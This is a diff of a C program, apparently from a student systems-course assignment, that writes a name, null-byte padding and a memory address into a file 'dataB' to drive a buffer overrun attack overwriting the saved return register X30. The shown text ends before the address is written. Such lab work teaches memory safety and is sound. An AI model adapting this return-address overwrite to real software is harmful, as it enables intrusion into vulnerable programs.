@@ -3,18 +3,16 @@
 /* Author: Sean Wang, Giao Vu Dinh                                    */
 /*--------------------------------------------------------------------*/
 
-
 #include <stdio.h>
 #include <string.h>
 enum {BUFSIZE = 48};
 
 /*--------------------------------------------------------------------*/
 
-
 /* Does not accept any command-line arguments or read text from stdin. 
-Writes bytes of data including student name, null bytes, and a memory 
-address to a file. Returns 0.
-*/
+   Writes bytes of data including student name, null bytes, and a 
+   memory address to file dataB, which is used to perform the 
+   "B" buffer overrun attack. Returns 0. */
 
 int main(void)
 {
@@ -27,13 +25,14 @@ int main(void)
    psName = "Sean Wang";
 
    /* Writes the student's name to the dataB file */
-   for (i = 0; i<strlen(psName); i++){
-       fprintf(psFile, "%c", psName[i]);
+   for (i = 0; i < strlen(psName); i++) {
+      fprintf(psFile, "%c", psName[i]);
    }
+   
    /* Writes enough null bytes to the dataB file
    to overrun until X30 */
-   for (i = 0; i<(BUFSIZE-(strlen(psName))); i++){
-       fprintf(psFile, "%c", 0x00);
+   for (i = 0; i < (BUFSIZE-(strlen(psName))); i++) {
+      fprintf(psFile, "%c", 0x00);
    }
 
    /* Writes the address which corresponds to 
